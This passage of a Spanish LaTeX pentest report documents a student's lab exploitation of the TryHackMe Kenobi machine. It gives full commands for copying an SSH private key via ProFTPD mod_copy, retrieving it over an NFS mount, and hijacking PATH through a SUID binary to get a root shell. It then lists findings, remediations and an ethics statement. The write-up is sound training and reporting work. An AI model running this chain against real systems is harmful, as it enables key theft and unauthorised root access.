La consulta identificó cuatro referencias relacionadas con la versión
evaluada, incluyendo funcionalidades de \texttt{mod\_copy}.

\evidence{
evidencias/escaneo/escaneo_KB-10_searchsploit_proftpd.png
}{
Resultados de SearchSploit para ProFTPD 1.3.5.
}

% =========================================================
% EXPLOTACIÓN
% =========================================================

\section{Explotación -- Kenobi}

\subsection{Abuso controlado de mod\_copy}

La funcionalidad \texttt{mod\_copy} de ProFTPD permitió realizar una
operación controlada de copia dentro del entorno de laboratorio.

Se utilizó la orden:

\begin{lstlisting}
SITE CPFR /home/kenobi/.ssh/id_rsa
\end{lstlisting}

seguida de:

\begin{lstlisting}
SITE CPTO /var/tmp/id_rsa
\end{lstlisting}

El servidor confirmó la copia del archivo hacia \texttt{/var/tmp}.

\evidence{
evidencias/explotacion/explotacion_KB-11_proftpd_modcopy.png
}{
Copia controlada de la clave privada SSH mediante mod\_copy.
}

\subsection{Acceso al recurso NFS}

Debido a que el recurso \texttt{/var} se encontraba exportado mediante
NFS, fue posible montarlo desde Kali:

\begin{lstlisting}
mkdir -p ~/TP_THM/mnt/kenobi_var
sudo mount -t nfs 10.64.134.243:/var ~/TP_THM/mnt/kenobi_var
\end{lstlisting}

La clave copiada previamente fue localizada en:

\begin{lstlisting}
~/TP_THM/mnt/kenobi_var/tmp/id_rsa
\end{lstlisting}

\evidence{
evidencias/explotacion/explotacion_KB-12_nfs_id_rsa.png
}{
Acceso a la clave privada copiada dentro del recurso NFS montado.
}

La clave fue copiada al entorno local y protegida mediante permisos
restrictivos antes de utilizarla:

\begin{lstlisting}
cp ~/TP_THM/mnt/kenobi_var/tmp/id_rsa ~/TP_THM/id_rsa_kenobi
chmod 600 ~/TP_THM/id_rsa_kenobi
\end{lstlisting}

\subsection{Acceso SSH como kenobi}

La clave obtenida permitió establecer una conexión SSH con el usuario
\texttt{kenobi}:

\begin{lstlisting}
ssh -i ~/TP_THM/id_rsa_kenobi kenobi@10.64.134.243
\end{lstlisting}

La identidad de la sesión fue verificada mediante:

\begin{lstlisting}
whoami
\end{lstlisting}

obteniéndose el usuario:

\begin{lstlisting}
kenobi
\end{lstlisting}

\evidence{
evidencias/explotacion/explotacion_KB-13_ssh_kenobi-01.png
}{
Inicio de la conexión SSH como kenobi.
}

\evidence{
evidencias/explotacion/explotacion_KB-13_ssh_kenobi-02.png
}{
Sesión SSH establecida como kenobi.
}

% =========================================================
% POST-EXPLOTACIÓN
% =========================================================

\section{Post-explotación y escalada -- Kenobi}

\subsection{Obtención de la flag de usuario}

Una vez establecida la sesión como \texttt{kenobi}, se verificó la
existencia del archivo correspondiente a la flag de usuario.

Por motivos de seguridad y para evitar exponer el valor obtenido, la flag
no se reproduce en texto plano en este informe.

Su hash SHA-256 se documenta en el Anexo C.

\evidence{
evidencias/explotacion/explotacion_KB-14_user_flag.png
}{
Verificación de la flag de usuario en el laboratorio.
}

\subsection{Enumeración de binarios SUID}

Se realizó una búsqueda de archivos con bit SUID:

\begin{lstlisting}
find / -perm -u=s -type f 2>/dev/null
\end{lstlisting}

Entre los resultados se identificó:

\begin{lstlisting}
/usr/bin/menu
\end{lstlisting}

El archivo pertenecía a \texttt{root} y presentaba el bit SUID activo.

\evidence{
evidencias/explotacion/explotacion_KB-15_suid_menu.png
}{
Identificación del binario SUID /usr/bin/menu.
}

\subsection{Análisis del binario SUID}

Se analizaron las cadenas de texto del binario:

\begin{lstlisting}
strings /usr/bin/menu
\end{lstlisting}

El análisis permitió observar que el programa ejecutaba comandos
relacionados con \texttt{curl}, entre otras operaciones.

Se verificó además la ubicación del ejecutable:

\begin{lstlisting}
which curl
\end{lstlisting}

y el contenido del \texttt{PATH} de la sesión:

\begin{lstlisting}
echo \$PATH
\end{lstlisting}

El directorio personal de \texttt{kenobi} aparecía al inicio del
\texttt{PATH}, antes de los directorios del sistema.

\subsection{Escalada mediante manipulación controlada del PATH}

Se creó un ejecutable denominado \texttt{curl} dentro del directorio
controlado por el usuario:

\begin{lstlisting}
mkdir -p /home/kenobi/bin
echo '#!/bin/sh' > /home/kenobi/bin/curl
echo 'id' >> /home/kenobi/bin/curl
chmod +x /home/kenobi/bin/curl
\end{lstlisting}

Posteriormente se ejecutó:

\begin{lstlisting}
/usr/bin/menu
\end{lstlisting}

La ejecución permitió comprobar que el comando era invocado con
privilegios de \texttt{root}.

\evidence{
evidencias/explotacion/explotacion_KB-16_escalada_suid_path.png
}{
Demostración de ejecución con privilegios elevados mediante manipulación del PATH.
}

\subsection{Obtención de shell con privilegios}

Para demostrar el impacto de la vulnerabilidad dentro del laboratorio,
se reemplazó el contenido del ejecutable controlado para invocar
\texttt{/bin/sh}:

\begin{lstlisting}
echo '#!/bin/sh' > /home/kenobi/bin/curl
echo '/bin/sh' >> /home/kenobi/bin/curl
chmod +x /home/kenobi/bin/curl
\end{lstlisting}

Luego se ejecutó nuevamente:

\begin{lstlisting}
/usr/bin/menu
whoami
\end{lstlisting}

La sesión resultante correspondió al usuario:

\begin{lstlisting}
root
\end{lstlisting}

\evidence{
evidencias/explotacion/explotacion_KB-17_shell_root.png
}{
Obtención de una shell con privilegios de root.
}

\subsection{Verificación de privilegios}

Finalmente se verificó el acceso al archivo correspondiente a la flag
de root.

El valor de la flag no se reproduce en el informe. Se documenta su
hash SHA-256 en el Anexo C.

\evidence{
evidencias/explotacion/explotacion_KB-18_root_flag_hash_redactada.png
}{
Verificación de la flag de root con el valor sensible redactado.
}

% =========================================================
% HALLAZGOS KENOBI
% =========================================================

\section{Hallazgos -- Kenobi}

\subsection{K-01 -- Exposición de recurso NFS}

\findingbox{medium}{Severidad: MEDIA}{
\textbf{ID:} K-01\\
\textbf{Fase:} Escaneo / Enumeración\\
\textbf{CWE:} CWE-732 -- Incorrect Permission Assignment for Critical Resource\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

Se identificó un recurso NFS que exportaba el directorio:

\begin{lstlisting}
/var
\end{lstlisting}

La exportación estaba disponible para cualquier origen indicado por la
configuración observada. La exposición del recurso permitió acceder desde
el laboratorio a contenido ubicado dentro de \texttt{/var}, incluyendo el
directorio \texttt{/var/tmp}.

\subsubsection{Componente afectado}

Servicio NFS y configuración de exportación del recurso \texttt{/var}.

\subsubsection{Evidencia}

\begin{itemize}
    \item \texttt{escaneo\_KB-04\_nfs\_exports.png}
    \item \texttt{escaneo\_KB-05\_rpcinfo.png}
    \item \texttt{explotacion\_KB-12\_nfs\_id\_rsa.png}
\end{itemize}

\subsubsection{Impacto}

Una exportación NFS excesivamente permisiva puede permitir acceso no
autorizado a archivos del sistema y facilitar cadenas de ataque posteriores.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item restringir los hosts autorizados a utilizar la exportación;
    \item evitar exportar directorios del sistema sin necesidad operativa;
    \item aplicar opciones de exportación restrictivas;
    \item revisar periódicamente la configuración de NFS;
    \item aplicar el principio de mínimo privilegio.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, una vez restringido el acceso al recurso y revisados sus permisos.

% ---------------------------------------------------------

\subsection{K-02 -- Uso de mod\_copy para copiar una clave privada SSH}

\findingbox{high}{Severidad: ALTA}{
\textbf{ID:} K-02\\
\textbf{Fase:} Explotación\\
\textbf{CWE:} CWE-22 -- Improper Limitation of a Pathname to a Restricted Directory\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

El servicio ProFTPD 1.3.5 expuesto en el puerto 21 permitió utilizar la
funcionalidad \texttt{mod\_copy} para copiar una clave privada SSH desde
\texttt{/home/kenobi/.ssh/id\_rsa} hacia \texttt{/var/tmp/id\_rsa}.

Posteriormente, debido a la exportación NFS de \texttt{/var}, el archivo
pudo ser recuperado desde el entorno de Kali.

\subsubsection{Componente afectado}

Servicio ProFTPD 1.3.5 y funcionalidad \texttt{mod\_copy}.

\subsubsection{Evidencia}

\begin{itemize}
    \item \texttt{escaneo\_KB-09\_proftpd\_banner.png}
    \item \texttt{escaneo\_KB-10\_searchsploit\_proftpd.png}
    \item \texttt{explotacion\_KB-11\_proftpd\_modcopy.png}
    \item \texttt{explotacion\_KB-12\_nfs\_id\_rsa.png}
\end{itemize}

\subsubsection{Impacto}

La posibilidad de copiar archivos sensibles mediante un servicio de red
puede permitir la exposición de credenciales o claves privadas y facilitar
el acceso a cuentas del sistema.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item actualizar o sustituir versiones vulnerables de ProFTPD;
    \item deshabilitar funcionalidades no necesarias;
    \item restringir el acceso al servicio FTP;
    \item proteger las claves privadas con permisos adecuados y passphrases;
    \item supervisar operaciones de copia y acceso sobre archivos sensibles.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, una vez actualizado el servicio y eliminada la posibilidad de copiar
archivos sensibles mediante funcionalidades innecesarias.

% ---------------------------------------------------------

\subsection{K-03 -- Escalada de privilegios mediante binario SUID y PATH}

\findingbox{high}{Severidad: ALTA}{
\textbf{ID:} K-03\\
\textbf{Fase:} Post-explotación\\
\textbf{CWE:} CWE-426 -- Untrusted Search Path\\
\textbf{CVE:} No aplica.
}

\subsubsection{Descripción}

Se identificó el binario SUID:

\begin{lstlisting}
/usr/bin/menu
\end{lstlisting}

El programa pertenecía a \texttt{root} y utilizaba comandos encontrados
mediante el \texttt{PATH}. El directorio controlado por el usuario
\texttt{/home/kenobi/bin} aparecía antes que los directorios del sistema.

Esta condición permitió crear un ejecutable controlado por el usuario con
el mismo nombre que el comando invocado por el programa y demostrar la
ejecución con privilegios de \texttt{root}.

\subsubsection{Componente afectado}

Binario SUID \texttt{/usr/bin/menu} y configuración del \texttt{PATH}.

\subsubsection{Evidencia}

\begin{itemize}
    \item \texttt{explotacion\_KB-15\_suid\_menu.png}
    \item \texttt{explotacion\_KB-16\_escalada\_suid\_path.png}
    \item \texttt{explotacion\_KB-17\_shell\_root.png}
\end{itemize}

\subsubsection{Impacto}

La combinación de un binario SUID con una búsqueda de comandos basada en
un \texttt{PATH} controlable por el usuario puede permitir ejecución de
código con privilegios elevados.

En la evaluación se demostró la obtención de una shell como
\texttt{root}.

\subsubsection{Salvaguardas recomendadas}

\begin{itemize}
    \item evitar el uso de \texttt{PATH} controlable por usuarios en
    programas privilegiados;
    \item utilizar rutas absolutas para ejecutar comandos;
    \item revisar y reducir binarios SUID innecesarios;
    \item aplicar el principio de mínimo privilegio;
    \item realizar auditorías periódicas de permisos SUID.
\end{itemize}

\subsubsection{Riesgo residual}

Bajo, una vez corregida la búsqueda de comandos y revisados los binarios
con privilegios elevados.

\subsection{Resumen de hallazgos}

\begin{center}
\begin{longtable}{|p{1.2cm}|p{4.4cm}|p{2.1cm}|p{3.2cm}|}
\hline
\textbf{ID} & \textbf{Hallazgo} & \textbf{Severidad} & \textbf{Impacto principal}\\
\hline
K-01 & Exposición de recurso NFS & Media & Confidencialidad / Integridad\\
\hline
K-02 & Uso de mod\_copy para copiar clave SSH & Alta & Confidencialidad / Integridad\\
\hline
K-03 & Escalada mediante SUID y PATH & Alta & Confidencialidad / Integridad\\
\hline
\end{longtable}
\end{center}

% =========================================================
% RECOMENDACIONES KENOBI
% =========================================================

\section{Recomendaciones post-pentesting -- Kenobi}

\subsection{Recomendaciones técnicas}

\begin{itemize}
    \item restringir las exportaciones NFS a los hosts estrictamente necesarios;
    \item evitar exportar directorios del sistema cuando no exista una necesidad operativa;
    \item actualizar ProFTPD y deshabilitar funcionalidades innecesarias;
    \item restringir el acceso al servicio FTP;
    \item proteger las claves privadas mediante permisos restrictivos y passphrases;
    \item revisar todos los binarios SUID instalados;
    \item utilizar rutas absolutas en programas ejecutados con privilegios elevados;
    \item evitar que directorios controlados por usuarios precedan a rutas del sistema en
    procesos privilegiados.
\end{itemize}

\subsection{Recomendaciones administrativas}

\begin{itemize}
    \item establecer revisiones periódicas de configuraciones NFS, FTP y SUID;
    \item documentar los servicios expuestos y justificar su necesidad;
    \item establecer procedimientos para la gestión y rotación de claves SSH;
    \item mantener actualizado el software de infraestructura;
    \item realizar evaluaciones periódicas de seguridad sobre servicios expuestos.
\end{itemize}

% =========================================================
% CONTINGENCIA KENOBI
% =========================================================

\section{Protocolo de contingencia -- Kenobi}

\subsection{Escenario de contingencia}

Se considera como escenario de contingencia el compromiso de una cuenta
mediante una cadena de explotación que combine exposición de servicios,
acceso a una clave privada SSH y posterior escalada de privilegios.

\subsection{Plan de respuesta}

\begin{enumerate}
    \item aislar temporalmente el sistema afectado;
    \item revocar las claves SSH potencialmente comprometidas;
    \item restringir o deshabilitar temporalmente los servicios FTP y NFS;
    \item revisar los binarios SUID y corregir configuraciones inseguras del PATH;
    \item preservar logs y evidencias;
    \item actualizar o sustituir los componentes vulnerables;
    \item restablecer credenciales y claves afectadas;
    \item verificar los permisos de los recursos compartidos;
    \item restaurar los servicios de manera controlada;
    \item realizar una validación posterior antes de retornar a operación.
\end{enumerate}

\subsection{Objetivos de recuperación propuestos}

Los siguientes valores se proponen exclusivamente como objetivos académicos
para el ejercicio:

\begin{center}
\begin{tabular}{|c|c|p{8cm}|}
\hline
\textbf{Indicador} & \textbf{Valor propuesto} & \textbf{Descripción}\\
\hline
RTO & 4 horas & Tiempo objetivo para recuperar la operación principal.\\
\hline
RPO & 1 hora & Pérdida máxima de información aceptable considerada para el ejercicio.\\
\hline
\end{tabular}
\end{center}

% =========================================================
% CONCLUSIONES KENOBI
% =========================================================

\section{Conclusiones -- Kenobi}

La evaluación de la sala Kenobi permitió aplicar técnicas de reconocimiento,
enumeración, explotación controlada y post-explotación dentro del entorno
autorizado de TryHackMe.

Se identificó una exportación NFS permisiva, un servicio ProFTPD 1.3.5 que
permitió utilizar la funcionalidad \texttt{mod\_copy} para copiar una clave
privada SSH y un binario SUID vulnerable a una manipulación del PATH.

La combinación de estas condiciones permitió establecer una sesión SSH como
\texttt{kenobi} y posteriormente demostrar una escalada de privilegios hasta
\texttt{root}.

Las recomendaciones propuestas se orientan a restringir los servicios
expuestos, proteger las claves privadas, actualizar componentes vulnerables
y eliminar condiciones que permitan la ejecución de comandos con privilegios
elevados.

% =========================================================
% =========================================================

% =========================================================
\section{Conclusiones generales}

La evaluación realizada sobre las salas Basic Pentesting y Kenobi permitió aplicar de manera práctica las distintas etapas de un proceso de pentesting dentro del entorno autorizado de TryHackMe.

En Basic Pentesting se identificaron servicios expuestos, recursos compartidos accesibles y condiciones que permitieron obtener acceso SSH a un usuario del sistema y realizar tareas de enumeración posteriores.

En Kenobi se identificaron servicios FTP, SMB y NFS expuestos, una configuración de ProFTPD que permitió utilizar 	\texttt{mod\_copy} para copiar una clave SSH y una condición de escalada de privilegios asociada a un binario SUID y al uso del PATH.

Los resultados muestran la importancia de reducir la exposición de servicios, mantener actualizados los componentes, restringir recursos compartidos, proteger las credenciales y revisar cuidadosamente los mecanismos que ejecutan comandos con privilegios elevados. Las evidencias y bitácoras incluidas permiten respaldar las acciones realizadas durante la evaluación.

% ANEXO A
% =========================================================

\newpage
\section{Anexo A -- Bitácora}

\subsection{Bitácora -- Basic Pentesting}

La bitácora correspondiente al núcleo obligatorio registra los comandos
utilizados durante la evaluación de la sala Basic Pentesting.

\begin{lstlisting}
\input{bitacora/clase_09_basic_pentesting.txt}
\end{lstlisting}

\subsection{Bitácora -- Kenobi}

La bitácora correspondiente a la sala de elección registra los comandos
utilizados durante la evaluación de la sala Kenobi.

\begin{lstlisting}
\input{bitacora/clase_10_kenobi.txt}
\end{lstlisting}

La bitácora no contiene contraseñas, claves privadas completas, tokens
ni otros secretos.
\newpage
\section{Anexo B -- Evidencias}

Las evidencias de la actividad se encuentran organizadas en:

\begin{lstlisting}
evidencias/
\end{lstlisting}

con las siguientes fases:

\begin{itemize}
    \item reconocimiento;
    \item escaneo;
    \item explotación;
    \item post-explotación.
\end{itemize}

\subsection{Evidencia de finalización de las salas}

La siguiente evidencia permite verificar el usuario utilizado y la finalización de las tres salas trabajadas en TryHackMe.

\evidence{
evidencias/reconocimiento/reconocimiento_THM_3_rooms_completadas.png
}{
Perfil de TryHackMe con el usuario camiluolivera2506 y las tres salas completadas.
}

Las evidencias documentan las fases de reconocimiento, escaneo, enumeración, explotación y post-explotación realizadas durante la evaluación de las salas Basic Pentesting y Kenobi.

\subsection{Evidencias principales}

\begin{center}
\begin{tabularx}{\textwidth}{|l|X|}
\hline
\textbf{Archivo} & \textbf{Descripción}\\
\hline
\texttt{reconocimiento\_BP-04\_ping.png} & Conectividad con el objetivo.\\
\hline
\texttt{escaneo\_BP-03\_nmap-01.png} & Puertos y servicios identificados.\\
\hline
\texttt{escaneo\_BP-04\_gobuster80.png} & Enumeración de directorios web.\\
\hline
\texttt{escaneo\_BP-05\_development\_dev.png} & Información expuesta en dev.txt.\\
\hline
\texttt{escaneo\_BP-06\_development\_j.png} & Información expuesta en j.txt.\\
\hline
\texttt{escaneo\_H-04\_smb\_anonymous.png} & Acceso al recurso SMB.\\
\hline
\texttt{escaneo\_H-04\_smb\_staff.png} & Contenido de staff.txt.\\
\hline
\texttt{explotacion\_BP-05\_acceso\_ssh\_jan-01.png} & Inicio de acceso SSH.\\
\hline
\texttt{explotacion\_BP-05\_acceso\_ssh\_jan-02.png} & Sesión SSH como jan.\\
\hline
\texttt{explotacion\_BP-06\_enumeracion\_jan\_kay.png} & Enumeración de kay.\\
\hline
\texttt{explotacion\_BP-07\_kay\_ssh\_key.png} & Identificación de id\_rsa.\\
\hline
\texttt{explotacion\_BP-08\_kay\_id\_rsa\_encrypted.png} & Evidencia de cifrado de la clave.\\
\hline
\end{tabularx}
\end{center}

% =========================================================
% ANEXO C
% =========================================================

\newpage
\section{Anexo C -- Hashes de las flags obtenidas}

Con el objetivo de documentar la obtención de las flags sin exponer su
contenido en texto plano, se registran únicamente sus valores de hash
SHA-256.

\begin{center}
\begin{tabularx}{\textwidth}{|p{5cm}|X|}
\hline
\textbf{Sala / evidencia} & \textbf{SHA-256} \\
\hline
Pentesting Fundamentals -- final &
\texttt{583f30ba446f9f74d509726d25956b4b75ad965f953feffc996f6ad1382dc8d6} \\
\hline
Kenobi -- user &
\texttt{3a8c5f64087db55e463965f4dc0d87ffeb9aa136ed06af15c5adecd63a4fca4d} \\
\hline
Kenobi -- root &
\texttt{3d1bf13f01925a6069660340258d73427955c3327132c030be6e497930cb7ef8} \\
\hline
\end{tabularx}
\end{center}

Los valores fueron verificados mediante SHA-256 durante la actividad.
No se incluyen las flags en texto plano, preservando la evidencia sin
exponer directamente los valores obtenidos.

% =========================================================
% ANEXO D
% =========================================================

\newpage
\section{Anexo D -- Declaración ética}

Declaro que todas las actividades realizadas durante la presente evaluación
se llevaron a cabo dentro del alcance autorizado, en entornos controlados y
con fines exclusivamente académicos.

Las técnicas utilizadas se limitaron al objetivo establecido para la
actividad práctica y se procuró preservar la integridad del entorno y de la
información observada.

\textbf{Firma:} Camila Olivera \hfill \textbf{Fecha:} 30/09/2026

\begin{tabular}{p{7cm}p{7cm}}
\centering
\rule{6cm}{0.4pt}\\
\centering Firma
&
\centering
\rule{6cm}{0.4pt}\\
\centering Fecha
\end{tabular}

\vfill

\begin{center}
\textit{Fin del informe}
\end{center}

\end{document}
